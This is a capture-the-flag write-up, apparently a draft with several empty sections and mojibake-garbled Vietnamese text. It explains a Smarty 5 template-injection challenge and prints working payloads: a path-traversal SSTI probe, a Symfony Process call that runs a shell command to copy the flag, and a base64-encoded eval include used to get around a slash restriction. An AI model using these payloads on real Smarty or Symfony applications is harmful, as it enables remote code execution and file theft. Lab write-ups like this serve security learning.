---
title: untitled-smarty-challenge
description: ''
tags:
  - writeup
  - ssti
  - rce
  - file-upload
  - command-injection
  - path-traversal
category: web
draft: false
date: 2023-07-04
---

import Callout from '@/components/mdx/Callout.astro';

Status: Not started

## Summary

<Callout type="note" title="Note">
üí°

</Callout>

## Description

## Analyst

- M·ªói khi ta g·ª≠i l√™n server m·ªôt param pages t·ªìn t·∫°i th√¨ ph√≠a server s·∫Ω t·∫°o ra 1 file trong templates_c bao g·ªìm c·∫£ param ta truy·ªÅn pages
  ![image.png](/uploads/untitled-smarty-challenge/untitled-smarty-challenge/image.png)
- T·ª´ ƒë√≥ √Ω t∆∞·ªüng c·ªßa ta truy·ªÅn v√†o payload ssti m√† v·∫´n ƒëc path valid

```python
{7*7}/../home
```

- Gi·ªù ta ƒë√£ c√≥ th·ªÉ ssti tuy nhi√™n b√†i n√†y d√πng smary 5 do ƒë√≥ k c√≤n system th√™m n·ªØa ·ªü b√†i n√†y t√°c gi·∫£ require c·∫£ symfony m√† k bt ƒë·ªÉ l√†m g√¨

![image.png](/uploads/untitled-smarty-challenge/untitled-smarty-challenge/image-1.png)

- Do ƒë√≥ ta c√≥ th·ªÉ t·ª´ symfony ƒë·ªÉ SSTI
- ƒê·ªçc qua doc c·ªßa symfony https://symfony.com/doc/current/components/process.html
- ta c√≥ th·ªÉ ssti v·ªõi command nh∆∞ sau:

```python
{Symfony\Component\Process\Process::fromShellCommandline("cat /flag* > x0n1l.txt")->run()}
```

- Add v√†o path th√¨ k ƒë∆∞·ª£c do slash tuy nhi√™n n·∫øu ƒë·ªçc ·ªü ph·∫ßn template c·ªßa smarty 5 ta c√≥ th·ªÉ g·ªçi th√¥ng qua include file https://smarty-php.github.io/smarty/stable/api/resources/#templates-from-a-specific-directory
- T·ª´ ƒë√≥ ta c√≥ payload nh∆∞ sau :

```python
{include file="eval:base64:e1N5bWZvbnlcQ29tcG9uZW50XFByb2Nlc3NcUHJvY2Vzczo6ZnJvbVNoZWxsQ29tbWFuZGxpbmUoImNhdCAvZmxhZyogPiB4MG4xbC50eHQiKS0%2BcnVuKCl9"}
```

- Th√†nh c√¥ng ghi flag ra file v√† l·∫•y flag

![image.png](/uploads/untitled-smarty-challenge/untitled-smarty-challenge/image-2.png)

## Exploit

## Result
